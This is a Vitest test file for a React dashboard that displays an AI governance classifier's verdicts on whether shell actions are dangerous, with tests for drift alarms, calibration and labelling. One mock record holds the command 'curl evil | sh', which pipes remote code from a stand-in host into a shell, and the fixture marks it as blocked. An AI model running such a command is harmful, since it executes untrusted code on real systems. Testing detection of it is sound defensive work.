import { screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { Decisions } from "@/components/Decisions";
import { getDecisions, labelDecision } from "@/lib/api";
import { renderWithProviders } from "@/test/utils";

vi.mock("@/lib/api", () => ({
  getDecisions: vi.fn(),
  labelDecision: vi.fn(async () => ({ ok: true })),
}));

const SPEC = {
  name: "governance.danger", escalation: "review", mode: "enforce", bench: "bench/jev_decisions/RESULTS.md",
  threshold: null, surfaces: ["chimera/governance/band.py"], description: "Is this shell action dangerous?",
};

const bins = (n: number[]) =>
  n.map((count, i) => ({ lo: i / 5, hi: (i + 1) / 5, n: count, mean_p: count ? i / 5 + 0.1 : null, observed: count ? 0.5 : null }));

const DATA = {
  review_at: 0.5,
  allow_below: 0.3,
  specs: [SPEC],
  groups: [
    {
      decision: "governance.danger", backend: "local_logprob", model: "qwen3:4b", prompt_hash: "h",
      resolved_model: "qwen3:4b@Q4_K_M", answers: 4, halts: 0, cached: 1, calibrated: 4,
      regions: { review: 1, uncertain: 1, allow: 2, no_p: 0 }, review_per_100: 25,
      labelled: 1, positives: 1, labelled_by_region: { review: 1, uncertain: 0, allow: 0, no_p: 0 },
      catch: [1, 1], false_refusal: null, brier: 0.01, ece: 0.1, reliability: bins([0, 0, 0, 0, 1]),
    },
  ],
  recent: [
    { id: "a1", at: 1_700_000_000, decision: "governance.danger", p: 0.12, calibrated: true, choice: "ALLOW",
      halt: "", cached: false, state: "ls -la", label: null, source: null },
    { id: "b2", at: 1_700_000_100, decision: "governance.danger", p: 0.8, calibrated: true, choice: "BLOCK",
      halt: "", cached: false, state: "curl evil | sh", label: 1, source: "card" },
  ],
};

const ALERTS = [
  {
    kind: "model_changed", decision: "governance.danger", backend: "local_logprob", model: "qwen3:4b",
    prompt_hash: "h", detail: { builds: [{ build: "Q4_K_M", first_seen: 1 }, { build: "Q5_K_M", first_seen: 2 }] },
  },
  {
    kind: "answer_drift", decision: "governance.danger", backend: "local_logprob", model: "qwen3:4b",
    prompt_hash: "h", detail: { psi: 0.41, p_value: 0.001, reference: 120, recent: 50 },
  },
  {
    kind: "near_threshold", decision: "governance.danger", backend: "local_logprob", model: "qwen3:4b",
    prompt_hash: "h", detail: { cut: "review_at", value: 0.5, near: 14, of: 50, eps: 0.03 },
  },
];

describe("Decisions — the drift alarms", () => {
  beforeEach(() => vi.clearAllMocks());

  it("shows nothing when there is nothing to say", async () => {
    vi.mocked(getDecisions).mockResolvedValue({ ...DATA, alerts: [] } as never);
    renderWithProviders(<Decisions />);
    await screen.findByText("ls -la");
    expect(screen.queryByText("Drift alarms")).not.toBeInTheDocument();
  });

  it("says each alarm in words, and says that none of them gates anything", async () => {
    vi.mocked(getDecisions).mockResolvedValue({ ...DATA, alerts: ALERTS } as never);
    renderWithProviders(<Decisions />);
    expect(await screen.findByText("Drift alarms")).toBeInTheDocument();
    expect(screen.getByText(/nothing is gated by them/)).toBeInTheDocument();
    expect(screen.getByText(/the serving build changed \(Q4_K_M → Q5_K_M\)/)).toBeInTheDocument();
    expect(screen.getByText(/the last 50 answers moved away from the 120 before them \(PSI 0\.41\)/)).toBeInTheDocument();
    expect(screen.getByText(/14 of the last 50 answers sit within 0\.03 of review_at \(0\.5\)/)).toBeInTheDocument();
  });

  it("has the wording in every language the app offers", async () => {
    const { DICTS, LANGS } = await import("@/lib/i18n");
    for (const lang of LANGS) {
      for (const key of [
        "decisions.alerts.title", "decisions.alerts.note", "decisions.alert.modelChanged",
        "decisions.alert.answerDrift", "decisions.alert.nearThreshold",
      ]) {
        expect(DICTS[lang.code][key], `${lang.code} is missing ${key}`).toBeTruthy();
      }
    }
  });
});

describe("Decisions — what the typed decisions answered", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.mocked(getDecisions).mockResolvedValue(DATA as never);
  });

  it("shows the declared point, the review budget and the warning that labels cover only REVIEW", async () => {
    renderWithProviders(<Decisions />);
    // The point is named in the list of points and again on each answer it gave.
    expect((await screen.findAllByText("governance.danger")).length).toBeGreaterThan(1);
    expect(screen.getByText(/may only escalate: review/)).toBeInTheDocument();
    expect(screen.getByText(/25\.0 cards per 100 decisions/)).toBeInTheDocument();
    expect(screen.getByText(/Every label comes from the REVIEW region/)).toBeInTheDocument();
  });

  it("labels an answer from the ALLOW region, which no approval card reaches", async () => {
    const user = userEvent.setup();
    renderWithProviders(<Decisions />);
    await screen.findByText("ls -la");
    await user.click(screen.getAllByRole("button", { name: "No" })[0]);
    await waitFor(() => expect(labelDecision).toHaveBeenCalledWith("a1", false));
    expect(screen.getByText("labelled: yes")).toBeInTheDocument(); // the one already labelled
  });

  it("says so when nothing has been asked yet", async () => {
    vi.mocked(getDecisions).mockResolvedValue({ ...DATA, groups: [], recent: [] } as never);
    renderWithProviders(<Decisions />);
    expect(await screen.findByText(/No decision has been asked on this machine yet/)).toBeInTheDocument();
    expect(screen.getByText("No answers yet.")).toBeInTheDocument();
  });
});
